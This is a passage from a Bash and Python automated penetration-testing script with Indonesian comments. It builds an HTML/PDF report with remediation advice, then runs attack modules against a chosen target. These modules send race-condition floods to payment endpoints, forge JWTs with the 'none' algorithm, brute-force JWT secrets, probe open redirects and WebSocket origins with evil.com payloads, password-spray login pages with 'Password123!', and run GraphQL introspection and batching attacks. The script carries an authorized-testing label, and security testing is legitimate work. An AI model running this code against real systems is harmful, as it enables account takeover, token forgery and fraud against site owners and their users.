        "Cookie flags: <code>HttpOnly; Secure; SameSite=Strict</code>",
        "Audit semua <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>",
    ]))
if S['sqli'] > 0:
    remeds.append(("var(--c)","bc","CRITICAL",f"SQL Injection ({S['sqli']} endpoint)",[
        "WAJIB: Prepared Statements — JANGAN string concatenation",
        "Implementasi ORM (Eloquent, Hibernate, SQLAlchemy)",
        "Principle of least privilege untuk database user",
        "Nonaktifkan verbose SQL error di production",
    ]))
if S['lfi'] > 0:
    remeds.append(("var(--c)","bc","CRITICAL",f"LFI / Path Traversal ({S['lfi']} confirmed)",[
        "JANGAN gunakan input user sebagai file path",
        "Implementasi <code>realpath()</code> + validasi base directory",
        "Nonaktifkan <code>allow_url_include</code> di php.ini",
        "Jalankan web server dengan minimal privilege",
    ]))
if S['cloud'] > 0:
    remeds.append(("var(--c)","bc","CRITICAL",f"Cloud Misconfiguration ({S['cloud']} bucket public)",[
        "SEGERA set bucket ke private di AWS/GCP/Azure console",
        "Aktifkan Block Public Access di S3",
        "Audit semua IAM policy dan bucket ACL",
        "Setup CloudTrail/audit logging untuk bucket access",
    ]))
if S['deser'] > 0:
    remeds.append(("var(--c)","bc","CRITICAL",f"Insecure Deserialization ({S['deser']} endpoint)",[
        "JANGAN deserialize data dari user input",
        "Gunakan JSON daripada serialized object format",
        "Implementasi integrity check (HMAC) sebelum deserialize",
        "Update library ke versi patched terbaru",
    ]))
if S['ssrf'] > 0:
    remeds.append(("var(--h)","bh","HIGH",f"SSRF ({S['ssrf']} kandidat)",[
        "Whitelist domain/IP yang boleh diakses server",
        "Block metadata endpoint: <code>169.254.169.254</code>, <code>metadata.google.internal</code>",
        "Validasi dan resolve DNS sebelum request",
        "Network segmentation — internal services tidak dari web",
    ]))
if S['cors'] > 0:
    remeds.append(("var(--h)","bh","HIGH",f"CORS Misconfiguration ({S['cors']} endpoint)",[
        "Set <code>Access-Control-Allow-Origin</code> eksplisit — bukan wildcard <code>*</code>",
        "Jangan kombinasikan <code>Allow-Credentials: true</code> dengan wildcard",
        "Validasi Origin header di server-side dengan whitelist",
    ]))
if S['spf']+S['dmarc'] > 0:
    remeds.append(("var(--h)","bh","HIGH",f"SPF/DMARC Missing (domain rentan email spoofing)",[
        "Tambahkan SPF record: <code>v=spf1 include:_spf.domain.com -all</code>",
        "Tambahkan DMARC: <code>v=DMARC1; p=reject; rua=mailto:dmarc@domain.com</code>",
        "Tambahkan DKIM untuk semua mail server yang mengirim email",
        "Test dengan: mail-tester.com atau mxtoolbox.com",
    ]))
if S['idor'] > 0:
    remeds.append(("var(--h)","bh","HIGH",f"IDOR ({S['idor']} potential)",[
        "Implementasi ownership check di setiap endpoint",
        "Gunakan UUID bukan sequential ID untuk resource",
        "Verifikasi session user vs resource owner di server-side",
        "Audit semua endpoint yang menerima ID parameter",
    ]))
if S['pp'] > 0:
    remeds.append(("var(--m)","bm","MEDIUM",f"Prototype Pollution ({S['pp']} endpoint)",[
        "<code>Object.freeze(Object.prototype)</code> di awal app",
        "Gunakan <code>Map()</code> atau <code>Object.create(null)</code>",
        "Tolak key: <code>__proto__</code>, <code>constructor</code>, <code>prototype</code>",
        "Update lodash ke versi terbaru",
    ]))
if S['oauth'] > 0:
    remeds.append(("var(--m)","bm","MEDIUM",f"OAuth Misconfiguration ({S['oauth']} issue)",[
        "Whitelist redirect_uri di server — tolak open redirect",
        "Implementasi state parameter untuk CSRF protection",
        "Gunakan PKCE untuk public clients",
        "Nonaktifkan implicit flow jika tidak perlu",
    ]))
if S['hdr'] > 0:
    remeds.append(("var(--lo)","bl","LOW",f"Missing Security Headers ({S['hdr']} header)",[
        "<code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code>",
        "<code>Content-Security-Policy: default-src 'self'</code>",
        "<code>X-Frame-Options: DENY</code>",
        "<code>X-Content-Type-Options: nosniff</code>",
        "<code>Referrer-Policy: strict-origin-when-cross-origin</code>",
    ]))

for color, bcls, sev, title, items in remeds:
    HTML += f'<div class="rem" style="border-left-color:{color}">\n'
    HTML += f'  <h3><span class="badge {bcls}">{sev}</span> &nbsp;{title}</h3>\n'
    HTML += '  <ul>\n'
    for item in items:
        HTML += f'    <li>{item}</li>\n'
    HTML += '  </ul>\n</div>\n'

# Caido box
HTML += f"""
<div class="caido-box">
  <h2>&#128279; Caido Integration</h2>
  <p style="color:var(--text2);margin:8px 0;font-size:.82em">
    Semua URLs &amp; verified findings dikirim ke Caido proxy<br>
    Filter: <code style="color:var(--pu)">X-Cassiopeia-Source: verified-finding</code>
  </p>
  <button class="cbtn" onclick="window.open('http://127.0.0.1:7777','_blank')">&#128279; Buka Caido GUI</button>
  <button class="cbtn sec" onclick="window.open('http://127.0.0.1:7777/history','_blank')">&#128203; History</button>
  <button class="cbtn sec" onclick="window.open('http://127.0.0.1:7777/automate','_blank')">&#9889; Automate</button>
</div>

<!-- CHECKLIST -->
<div class="sdiv"><span>Manual Verification Checklist</span></div>
<div class="card">
  <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:.8em">
    <div>&#9744; Verifikasi XSS di browser nyata</div>
    <div>&#9744; Konfirmasi SQLi — dump tabel users</div>
    <div>&#9744; Test LFI — baca /etc/passwd</div>
    <div>&#9744; SSRF — verify AWS/GCP metadata</div>
    <div>&#9744; CORS — test dari browser fetch()</div>
    <div>&#9744; JWT — test none algorithm attack</div>
    <div>&#9744; GraphQL — dump full schema</div>
    <div>&#9744; IDOR — horizontal &amp; vertical privilege</div>
    <div>&#9744; Business logic — workflow bypass</div>
    <div>&#9744; Race condition — Caido Automate</div>
    <div>&#9744; XXE — OOB via DNS/HTTP</div>
    <div>&#9744; HTTP Smuggling — CL.TE &amp; TE.CL</div>
    <div>&#9744; Auth bypass — modified JWT/Cookie</div>
    <div>&#9744; Exposed .git — source code review</div>
    <div>&#9744; Subdomain takeover check</div>
    <div>&#9744; Cloud bucket — list &amp; download test</div>
    <div>&#9744; Email spoofing — send test email</div>
    <div>&#9744; Deserialization — RCE confirm</div>
  </div>
</div>
</div>

<div class="footer">
  Cassiopeia Pentest v4.0.0 &nbsp;|&nbsp; by Xyra77 &nbsp;|&nbsp;
  {DOMAIN} &nbsp;|&nbsp; {NOW} &nbsp;|&nbsp;
  AUTHORIZED PENETRATION TESTING ONLY
</div>

<script>
// Chart defaults
Chart.defaults.color = '#8b949e';
Chart.defaults.borderColor = '#21262d';

var donutCfg = {{
  type: 'doughnut',
  options: {{
    responsive: true, maintainAspectRatio: true,
    animation: {{ animateRotate: true, duration: 1200 }},
    plugins: {{
      legend: {{ display: false }},
      tooltip: {{ callbacks: {{ label: function(c){{ return c.label+': '+c.raw; }} }} }}
    }},
    cutout: '70%'
  }}
}};

// Risk Distribution
new Chart(document.getElementById('riskDonut'), Object.assign({{}}, donutCfg, {{
  data: {{
    labels: ['Critical','High','Medium','Low','Info'],
    datasets: [{{ data: [{S['total_c']},{S['total_h']},{S['total_m']},{S['total_l']},{S['total_i']}],
      backgroundColor: ['#ff4d4d','#ff8c00','#ffd700','#4caf50','#58a6ff'],
      borderColor: '#0d1117', borderWidth: 3, hoverOffset: 6
    }}]
  }}
}}));

// Vuln Type
new Chart(document.getElementById('vulnDonut'), Object.assign({{}}, donutCfg, {{
  data: {{
    labels: ['XSS','SQLi','SSRF','LFI','Code Inj','Auth/BL','DNS/Cloud','Other'],
    datasets: [{{ data: [{S['xss']+S['bxss']},{S['sqli']},{S['ssrf']},{S['lfi']},{S['php']+S['py']+S['jsij']},{S['idor']+S['mass']+S['oauth']},{S['spf']+S['dmarc']+S['cloud']},{S['cors']+S['gql']+S['pp']}],
      backgroundColor: ['#ff4d4d','#ff8c00','#ffd700','#bc8cff','#39d0d8','#4caf50','#e84393','#58a6ff'],
      borderColor: '#0d1117', borderWidth: 3, hoverOffset: 6
    }}]
  }}
}}));

// OWASP
new Chart(document.getElementById('owaspDonut'), Object.assign({{}}, donutCfg, {{
  data: {{
    labels: ['A01','A02','A03','A05','A07','A08','A10','A04'],
    datasets: [{{ data: [{S['idor']+S['lfi']},{S['sec']},{S['xss']+S['sqli']},{S['hdr']+S['spf']+S['dmarc']},{S['oauth']+S['session']},{S['deser']},{S['ssrf']},{S['mass']+S['bl']}],
      backgroundColor: ['#ff4d4d','#ff6b6b','#ff8c00','#ffa500','#ffd700','#4caf50','#39d0d8','#58a6ff'],
      borderColor: '#0d1117', borderWidth: 2, hoverOffset: 6
    }}]
  }}
}}));

// Recon Bar
new Chart(document.getElementById('reconBar'), {{
  type: 'bar',
  data: {{
    labels: ['Subdomains','Live Hosts','URLs','Params','Secrets','Cert Trans'],
    datasets: [{{ label: 'Count',
      data: [{S['subs']},{S['live']},{S['urls']},{S['params']},{S['sec']},{S['cert']}],
      backgroundColor: ['#39d0d8','#58a6ff','#bc8cff','#ffd700','#ff8c00','#4caf50'],
      borderRadius: 5, borderWidth: 0
    }}]
  }},
  options: {{
    responsive: true, maintainAspectRatio: false,
    animation: {{ duration: 800 }},
    plugins: {{ legend: {{ display: false }} }},
    scales: {{
      x: {{ ticks: {{ font: {{ size: 10 }} }}, grid: {{ color: '#21262d' }} }},
      y: {{ beginAtZero: true, grid: {{ color: '#21262d' }} }}
    }}
  }}
}});

// CVSS Bar
new Chart(document.getElementById('cvssBar'), {{
  type: 'bar',
  data: {{
    labels: ['Critical\\n9.0-10','High\\n7.0-8.9','Medium\\n4.0-6.9','Low\\n0-3.9'],
    datasets: [{{ label: 'Findings',
      data: [{S['cc']},{S['ch']},{S['cm']},{S['cl']}],
      backgroundColor: ['#ff4d4d','#ff8c00','#ffd700','#4caf50'],
      borderRadius: 5, borderWidth: 0
    }}]
  }},
  options: {{
    responsive: true, maintainAspectRatio: false,
    animation: {{ duration: 800 }},
    plugins: {{ legend: {{ display: false }} }},
    scales: {{
      x: {{ ticks: {{ font: {{ size: 10 }} }}, grid: {{ color: '#21262d' }} }},
      y: {{ beginAtZero: true, grid: {{ color: '#21262d' }} }}
    }}
  }}
}});

// Tab switching
function switchTab(sev, el) {{
  document.querySelectorAll('.tab').forEach(function(t){{ t.classList.remove('active'); }});
  document.querySelectorAll('.tc').forEach(function(c){{ c.classList.remove('active'); }});
  el.classList.add('active');
  document.getElementById('tab-'+sev).classList.add('active');
}}

// Animate stat numbers
document.querySelectorAll('.sn').forEach(function(el) {{
  var target = parseInt(el.textContent);
  if (isNaN(target) || target === 0) return;
  var step = Math.max(1, Math.ceil(target / 40));
  var cur = 0;
  var timer = setInterval(function() {{
    cur = Math.min(cur + step, target);
    el.textContent = cur;
    if (cur >= target) clearInterval(timer);
  }}, 25);
}});
</script>
</body></html>"""

with open(HTML_FILE, 'w', encoding='utf-8') as f:
    f.write(HTML)
print(f"[OK] HTML Report -> {HTML_FILE}")
print(f"[OK] Size: {len(HTML)//1024} KB")
PYEOF

notify OK "HTML Report -> ${HTML_FILE}"

# ── GENERATE PDF ─────────────────────────────────────────────────
notify INFO "Generating PDF from HTML..."

# Try weasyprint first (best quality)
if python3 -c "import weasyprint" 2>/dev/null; then
    python3 << PDFEOF
from weasyprint import HTML as WH
import os
html_file = "${HTML_FILE}"
pdf_file  = "${PDF_FILE}"
try:
    WH(filename=html_file).write_pdf(pdf_file)
    size = os.path.getsize(pdf_file) // 1024
    print(f"[OK] PDF via WeasyPrint -> {pdf_file} ({size} KB)")
except Exception as e:
    print(f"[!] WeasyPrint error: {e}")
PDFEOF

# Try chromium/puppeteer fallback
elif command -v chromium &>/dev/null; then
    notify INFO "PDF via Chromium headless..."
    chromium --headless --no-sandbox \
        --print-to-pdf="${PDF_FILE}" \
        --print-to-pdf-no-header \
        "file://${HTML_FILE}" 2>/dev/null && \
        notify OK "PDF via Chromium -> ${PDF_FILE}" || \
        notify WARN "Chromium PDF failed"

elif command -v google-chrome &>/dev/null; then
    google-chrome --headless --no-sandbox \
        --print-to-pdf="${PDF_FILE}" \
        "file://${HTML_FILE}" 2>/dev/null && \
        notify OK "PDF via Chrome -> ${PDF_FILE}"

else
    notify WARN "WeasyPrint + Chromium not found -- install: pip install weasyprint"
    notify INFO "Open HTML in browser and press Ctrl+P -> Save as PDF"
fi

notify OK "Report complete!"
notify INFO "HTML: ${HTML_FILE}"
notify INFO "PDF : ${PDF_FILE}"

# ================================================================
#  UPGRADE P6 -- RACE CONDITION + WEBSOCKET + PASSWORD SPRAY
# ================================================================
update_turbo; show_time_status
should_skip 25 || separator "UPGRADE P6 -- RACE CONDITION + WEBSOCKET + PASSWORD SPRAY"
if ! $PHASE_SKIPPED; then

    # ── P6.1: RACE CONDITION ─────────────────────────────────
    notify INFO "Race condition test -- concurrent requests..."
    tool_done "${OUTPUT_DIR}/auth/race_condition.txt" 10 || {
        {
            echo "=== RACE CONDITION TEST === $(date)"

            # Detect endpoints yang berpotensi race condition
            RACE_ENDPOINTS=()
            for ep in "/api/transfer" "/api/payment" "/api/redeem" \
                      "/api/coupon" "/api/vote" "/api/like" \
                      "/checkout" "/order" "/buy" "/apply" \
                      "/api/withdraw" "/api/claim" "/api/register"; do
                CODE=$(rq -o /dev/null -w "%{http_code}" \
                       --max-time 5 "${TARGET_URL}${ep}" 2>/dev/null)
                [[ "$CODE" =~ ^(200|302|400|401|403|405)$ ]] && \
                    RACE_ENDPOINTS+=("${TARGET_URL}${ep}")
            done

            # Juga test dari URL yang found
            while IFS= read -r url; do
                echo "$url" | grep -qiE "transfer|payment|redeem|coupon|vote|claim|buy|order" && \
                    RACE_ENDPOINTS+=("$url")
            done < <(grep "${DOMAIN}" \
                "${OUTPUT_DIR}/params/all_urls.txt" 2>/dev/null | head -20)

            echo "[*] Race condition endpoints found: ${#RACE_ENDPOINTS[@]}"
            echo ""

            # Test race condition dengan concurrent requests
            RACE_CONCURRENCY=${RACE_CONCURRENCY:-20}
            [[ $TURBO_LEVEL -ge 2 ]] && RACE_CONCURRENCY=10

            for ep in "${RACE_ENDPOINTS[@]:0:5}"; do
                echo "--- Testing: $ep ---"

                # Kirim N request bersamaan
                RACE_OUT=$(mktemp -d)
                for i in $(seq 1 $RACE_CONCURRENCY); do
                    (
                        RESP=$(rq -X POST --max-time 5 \
                               -H "Content-Type: application/json" \
                               -d '{"amount":1}' \
                               "$ep" -w "\nHTTP:%{http_code}" 2>/dev/null)
                        CODE=$(echo "$RESP" | grep "HTTP:" | cut -d: -f2)
                        BODY=$(echo "$RESP" | grep -v "HTTP:" | head -1)
                        echo "${CODE}|${BODY:0:50}" > "${RACE_OUT}/${i}.txt"
                    ) &
                done
                wait

                # Analisis hasil
                CODES=$(cat "${RACE_OUT}"/*.txt 2>/dev/null | cut -d'|' -f1 | sort | uniq -c)
                SUCCESS_COUNT=$(cat "${RACE_OUT}"/*.txt 2>/dev/null | \
                    grep -c "^200\|^201" || echo 0)
                echo "  Concurrent: ${RACE_CONCURRENCY} requests"
                echo "  Response codes: $CODES"
                [[ $SUCCESS_COUNT -gt 1 ]] && \
                    echo "  [!!!] RACE CONDITION POTENTIAL: ${SUCCESS_COUNT}x 200 response!"
                rm -rf "$RACE_OUT"
                echo ""
            done

        } | tee "${OUTPUT_DIR}/auth/race_condition.txt"
        RACE_CNT=$(grep -c "POTENTIAL\|!!!" \
            "${OUTPUT_DIR}/auth/race_condition.txt" 2>/dev/null || echo 0)
        notify OK "Race condition -> ${RACE_CNT} potential -> auth/race_condition.txt"
    }

    # ── P6.2: WEBSOCKET DETECTION & TEST ─────────────────────
    notify INFO "WebSocket detection & security test..."
    tool_done "${OUTPUT_DIR}/auth/websocket.txt" 10 || {
        {
            echo "=== WEBSOCKET TEST === $(date)"

            # Detect WebSocket endpoints dari source
            WS_ENDPOINTS=()

            # Scanning JS files for WebSocket endpoints
            grep -rh "WebSocket\|new WS\|ws://\|wss://" \
                "${OUTPUT_DIR}/js_analysis/files/" 2>/dev/null | \
                grep -oE '(wss?://[^"'"'"'` ]+|/ws[^"'"'"'` ]*|/socket[^"'"'"'` ]*)' | \
                sort -u | head -10 | while read -r wse; do
                echo "[FOUND JS] WebSocket endpoint: $wse"
                WS_ENDPOINTS+=("$wse")
            done

            # Common WS paths
            for wsp in "/ws" "/websocket" "/socket" "/socket.io" \
                       "/ws/chat" "/ws/notify" "/api/ws" "/realtime"; do
                CODE=$(rq -o /dev/null -w "%{http_code}" \
                       -H "Upgrade: websocket" \
                       -H "Connection: Upgrade" \
                       -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                       -H "Sec-WebSocket-Version: 13" \
                       --max-time 5 "${TARGET_URL}${wsp}" 2>/dev/null)
                [[ "$CODE" == "101" ]] && \
                    echo "[FOUND] WebSocket: ${TARGET_URL}${wsp} -> $CODE (101 Switching Protocols)" && \
                    WS_ENDPOINTS+=("${TARGET_URL}${wsp}")
                [[ "$CODE" == "200" ]] && \
                    echo "[CHECK] Possible WS: ${TARGET_URL}${wsp} -> $CODE"
            done

            # Test WS security jika found
            if [[ ${#WS_ENDPOINTS[@]} -gt 0 ]]; then
                echo ""
                echo "--- WebSocket Security Tests ---"

                # Origin check bypass
                for ws_ep in "${WS_ENDPOINTS[@]:0:3}"; do
                    CODE=$(rq -o /dev/null -w "%{http_code}" \
                           -H "Upgrade: websocket" \
                           -H "Connection: Upgrade" \
                           -H "Origin: https://evil.com" \
                           -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
                           -H "Sec-WebSocket-Version: 13" \
                           --max-time 5 "$ws_ep" 2>/dev/null)
                    [[ "$CODE" == "101" ]] && \
                        echo "[!!!] WEBSOCKET CROSS-ORIGIN BYPASS: $ws_ep (Origin: evil.com -> 101)"
                    echo "[i] Origin test: $ws_ep -> $CODE"
                done
            else
                echo "[-] No WebSocket endpoint found"
            fi

        } | tee "${OUTPUT_DIR}/auth/websocket.txt"
        WS_CNT=$(grep -c "FOUND\|!!!" \
            "${OUTPUT_DIR}/auth/websocket.txt" 2>/dev/null || echo 0)
        notify OK "WebSocket -> ${WS_CNT} findings -> auth/websocket.txt"
    }

    # ── P6.3: JWT BRUTE FORCE ────────────────────────────────
    notify INFO "JWT secret brute force..."
    tool_done "${OUTPUT_DIR}/auth/jwt_brute.txt" 10 || {
        {
            echo "=== JWT BRUTE FORCE === $(date)"

            # Ambil JWT dari scan sebelumnya
            JWT_TOKEN=""
            [[ -f "${OUTPUT_DIR}/jwt/jwt_found.txt" ]] && \
                JWT_TOKEN=$(grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' \
                "${OUTPUT_DIR}/jwt/jwt_found.txt" | head -1)

            # Coba ambil dari cookies juga
            [[ -z "$JWT_TOKEN" ]] && \
                JWT_TOKEN=$(grep -rh 'eyJ[A-Za-z0-9_-]\{20,\}\.[A-Za-z0-9_-]\{20,\}\.[A-Za-z0-9_-]\{10,\}' \
                "${OUTPUT_DIR}/headers/" "${OUTPUT_DIR}/auth/" 2>/dev/null | \
                grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)

            if [[ -z "$JWT_TOKEN" ]]; then
                echo "[-] No JWT found for brute force"
            else
                echo "[*] JWT found: ${JWT_TOKEN:0:50}..."

                # Decode header & payload
                HEADER=$(echo "$JWT_TOKEN" | cut -d'.' -f1 | \
                    python3 -c "import sys,base64,json; \
                    d=sys.stdin.read().strip(); \
                    pad=d+'='*(-len(d)%4); \
                    print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)),indent=2))" \
                    2>/dev/null)
                PAYLOAD=$(echo "$JWT_TOKEN" | cut -d'.' -f2 | \
                    python3 -c "import sys,base64,json; \
                    d=sys.stdin.read().strip(); \
                    pad=d+'='*(-len(d)%4); \
                    print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)),indent=2))" \
                    2>/dev/null)

                echo "Header: $HEADER"
                echo "Payload: $PAYLOAD"
                echo ""

                # Checking algorithm none attack
                NONE_JWT=$(python3 -c "
import base64, json
parts = '${JWT_TOKEN}'.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
header['alg'] = 'none'
new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload = parts[1]
print(f'{new_header}.{payload}.')
" 2>/dev/null)
                if [[ -n "$NONE_JWT" ]]; then
                    RESP=$(rq -H "Authorization: Bearer ${NONE_JWT}" \
                           --max-time 8 "${TARGET_URL}/api/user" 2>/dev/null)
                    echo "$RESP" | grep -qiE "user|profile|admin|id" && \
                        echo "[!!!] JWT NONE ALGORITHM ATTACK BERHASIL!" || \
                        echo "[-] None algorithm ditolak server"
                fi

                # Brute force secret dengan common list
                echo ""
                echo "--- Brute Force JWT Secret ---"
                JWT_SECRETS=(
                    "secret" "password" "123456" "jwt_secret" "your-256-bit-secret"
                    "supersecret" "secret123" "jwt-secret" "mysecret" "app_secret"
                    "jwt" "key" "private" "admin" "root" "test" "dev"
                    "production" "secretkey" "jwttoken" "token" "api_key"
                )
                [[ -n "$PASS_WL" && -f "$PASS_WL" ]] && \
                    while IFS= read -r line; do JWT_SECRETS+=("$line"); done \
                    < <(head -200 "$PASS_WL" 2>/dev/null)

                python3 << JWTPY
import hmac, hashlib, base64, json, sys

token = "${JWT_TOKEN}"
parts = token.split('.')
if len(parts) != 3:
    print("[-] Invalid JWT format")
    sys.exit()

header_payload = f"{parts[0]}.{parts[1]}"
sig = parts[2]

# Pad sig
sig_padded = sig + '=' * (-len(sig) % 4)
sig_bytes = base64.urlsafe_b64decode(sig_padded)

secrets = [
    "secret","password","123456","jwt_secret","your-256-bit-secret",
    "supersecret","secret123","jwt-secret","mysecret","app_secret",
    "jwt","key","private","admin","root","test","dev",
    "production","secretkey","jwttoken","token","api_key",
    "${DOMAIN}","${DOMAIN}-secret","cassiopeia"
]

found = False
for s in secrets:
    try:
        mac = hmac.new(s.encode(), header_payload.encode(), hashlib.sha256).digest()
        mac_b64 = base64.urlsafe_b64encode(mac).decode().rstrip('=')
        if mac_b64 == sig:
            print(f"[!!!] JWT SECRET DITEMUKAN: '{s}'")
            found = True
            break
    except: pass

if not found:
    print(f"[-] Secret tidak found dari {len(secrets)} kandidat")
JWTPY
            fi

        } | tee "${OUTPUT_DIR}/auth/jwt_brute.txt"
        JWT_BRUTE=$(grep -c "!!!" \
            "${OUTPUT_DIR}/auth/jwt_brute.txt" 2>/dev/null || echo 0)
        notify OK "JWT brute -> ${JWT_BRUTE} critical -> auth/jwt_brute.txt"
    }

    # ── P6.4: OPEN REDIRECT CHAINING ─────────────────────────
    notify INFO "Open redirect detection & chaining test..."
    tool_done "${OUTPUT_DIR}/auth/open_redirect.txt" 10 || {
        {
            echo "=== OPEN REDIRECT TEST === $(date)"

            REDIRECT_PARAMS=(redirect url next return_to callback \
                             redirect_url return_url destination dest \
                             forward target to from location out link)
            REDIRECT_PAYLOADS=(
                "https://evil.com"
                "//evil.com"
                "https://evil.com%0d%0a"
                "/\\evil.com"
                "https:evil.com"
                "https://legit.com@evil.com"
                "https://evil.com%2F%2E%2E"
                "%09//evil.com"
                "////evil.com"
            )

            FOUND_REDIRECTS=()
            for param in "${REDIRECT_PARAMS[@]}"; do
                for payload in "${REDIRECT_PAYLOADS[@]}"; do
                    CODE=$(rq -o /dev/null -w "%{http_code}" \
                           --max-time 5 \
                           "${TARGET_URL}?${param}=${payload}" 2>/dev/null)
                    if [[ "$CODE" =~ ^(301|302|303|307|308)$ ]]; then
                        LOC=$(rq -sI --max-time 5 \
                              "${TARGET_URL}?${param}=${payload}" \
                              2>/dev/null | grep -i "^location:" | head -1)
                        echo "$LOC" | grep -qiE "evil\.com|attacker" && {
                            echo "[!!!] OPEN REDIRECT CONFIRMED!"
                            echo "  URL   : ${TARGET_URL}?${param}=${payload}"
                            echo "  -> Redirect to: $LOC"
                            FOUND_REDIRECTS+=("${TARGET_URL}?${param}=${payload}")
                        }
                    fi
                done
            done

            # Juga test dari URL yang ada parameter redirect
            grep "${DOMAIN}" "${OUTPUT_DIR}/params/urls_with_params.txt" 2>/dev/null | \
            grep -iE "redirect|return|next|callback|url=" | head -20 | \
            while IFS= read -r url; do
                for payload in "https://evil.com" "//evil.com"; do
                    TEST_URL=$(echo "$url" | sed "s/=[^&]*/=${payload}/g")
                    CODE=$(rq -o /dev/null -w "%{http_code}" \
                           --max-time 5 "$TEST_URL" 2>/dev/null)
                    [[ "$CODE" =~ ^(301|302|303|307)$ ]] && {
                        LOC=$(rq -sI --max-time 5 "$TEST_URL" 2>/dev/null | \
                            grep -i "^location:" | head -1)
                        echo "$LOC" | grep -qiE "evil" && \
                            echo "[!!!] OPEN REDIRECT: $TEST_URL -> $LOC"
                    }
                done
            done

            echo ""
            echo "Total redirects: ${#FOUND_REDIRECTS[@]}"

        } | tee "${OUTPUT_DIR}/auth/open_redirect.txt"
        OR_CNT=$(grep -c "CONFIRMED\|!!!" \
            "${OUTPUT_DIR}/auth/open_redirect.txt" 2>/dev/null || echo 0)
        notify OK "Open Redirect -> ${OR_CNT} confirmed -> auth/open_redirect.txt"
    }

    # ── P6.5: PASSWORD SPRAYING ──────────────────────────────
    notify INFO "Password spraying -- 1 password, many accounts..."
    tool_done "${OUTPUT_DIR}/auth/password_spray.txt" 10 || {
        {
            echo "=== PASSWORD SPRAYING === $(date)"
            echo "[i] Target: login endpoints di ${DOMAIN}"
            echo ""

            # Detect login endpoint
            LOGIN_EPS=()
            for ep in "/login" "/signin" "/auth/login" "/api/login" \
                      "/api/auth" "/user/login" "/account/login" \
                      "/admin/login" "/wp-login.php" "/administrator"; do
                CODE=$(rq -o /dev/null -w "%{http_code}" \
                       --max-time 5 "${TARGET_URL}${ep}" 2>/dev/null)
                [[ "$CODE" =~ ^(200|301|302|405)$ ]] && \
                    LOGIN_EPS+=("${TARGET_URL}${ep}")
            done

            if [[ ${#LOGIN_EPS[@]} -eq 0 ]]; then
                echo "[-] No login endpoint found"
            else
                echo "[*] Login endpoints: ${LOGIN_EPS[*]}"
                echo ""

                # Common usernames
                USERNAMES=(admin administrator user test guest root \
                           webmaster info support contact \
                           $(echo "$DOMAIN" | cut -d'.' -f1))

                # Spray dengan 1 password umum (tidak agresif)
                SPRAY_PASS="Password123!"

                for ep in "${LOGIN_EPS[@]:0:2}"; do
                    echo "--- Spraying: $ep ---"
                    for user in "${USERNAMES[@]}"; do
                        RESP=$(rq -X POST --max-time 8 \
                               -d "username=${user}&password=${SPRAY_PASS}" \
                               -d "email=${user}@${DOMAIN}&password=${SPRAY_PASS}" \
                               -w "\nHTTP:%{http_code}" \
                               "$ep" 2>/dev/null)
                        CODE=$(echo "$RESP" | grep "HTTP:" | cut -d: -f2)
                        BODY=$(echo "$RESP" | grep -v "HTTP:")
                        # Checking tanda sukses
                        echo "$BODY" | grep -qiE "dashboard|welcome|logout|token|success" && {
                            echo "[!!!] LOGIN BERHASIL: user=${user} pass=${SPRAY_PASS} di $ep"
                        }
                        echo "$BODY" | grep -qiE "locked|blocked|too many\|rate limit" && {
                            echo "[!] Account locked/rate limited detected di $ep"
                            break
                        }
                        sleep ${SPRAY_SLEEP:-1}
                    done
                    echo ""
                done
            fi

        } | tee "${OUTPUT_DIR}/auth/password_spray.txt"
        SPRAY_CNT=$(grep -c "LOGIN BERHASIL\|!!!" \
            "${OUTPUT_DIR}/auth/password_spray.txt" 2>/dev/null || echo 0)
        notify OK "Password spray -> ${SPRAY_CNT} login -> auth/password_spray.txt"
    }

    # ── P6.6: GRAPHQL DEEP TEST ──────────────────────────────
    notify INFO "GraphQL deep testing -- mutation + enum + injection..."
    tool_done "${OUTPUT_DIR}/graphql/deep_test.txt" 10 || {
        {
            echo "=== GRAPHQL DEEP TEST === $(date)"

            GQL_EP=""
            for ep in /graphql /api/graphql /graphiql /v1/graphql /gql; do
                CODE=$(rq -o /dev/null -w "%{http_code}" \
                       --max-time 5 "${TARGET_URL}${ep}" 2>/dev/null)
                [[ "$CODE" =~ ^(200|400)$ ]] && GQL_EP="${TARGET_URL}${ep}" && break
            done

            if [[ -z "$GQL_EP" ]]; then
                echo "[-] GraphQL endpoint tidak found"
            else
                echo "[*] GraphQL endpoint: $GQL_EP"
                echo ""

                # Full schema dump
                echo "--- Schema Introspection ---"
                SCHEMA=$(px curl -sk -X POST \
                    -H "Content-Type: application/json" \
                    -d '{"query":"{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } mutationType { fields { name description } } types { name kind fields { name } } } }"}' \
                    "$GQL_EP" 2>/dev/null)
                echo "$SCHEMA" | python3 -c "
import json,sys
try:
    d = json.load(sys.stdin)
    schema = d.get('data',{}).get('__schema',{})
    # Queries
    qfields = schema.get('queryType',{}).get('fields',[]) or []
    print(f'[*] Queries ({len(qfields)}):')
    for q in qfields[:15]: print(f'  - {q[\"name\"]}')
    # Mutations
    mfields = schema.get('mutationType',{}).get('fields',[]) or []
    print(f'[*] Mutations ({len(mfields)}):')
    for m in mfields[:15]: print(f'  - {m[\"name\"]}')
    # Types
    types = [t for t in (schema.get('types') or []) if not t['name'].startswith('__')]
    print(f'[*] Types ({len(types)}):')
    for t in types[:15]: print(f'  - {t[\"name\"]} ({t[\"kind\"]})')
except Exception as e: print(f'Error: {e}')
" 2>/dev/null

                # Batching attack
                echo ""
                echo "--- Batch Query Attack ---"
                BATCH=$(px curl -sk -X POST \
                    -H "Content-Type: application/json" \
                    -d '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]' \
                    "$GQL_EP" 2>/dev/null)
                echo "$BATCH" | grep -q "__typename" && \
                    echo "[!] GRAPHQL BATCHING ENABLED -- rentan DoS & brute force bypass"

                # SQL injection via GraphQL
                echo ""
                echo "--- SQLi via GraphQL ---"
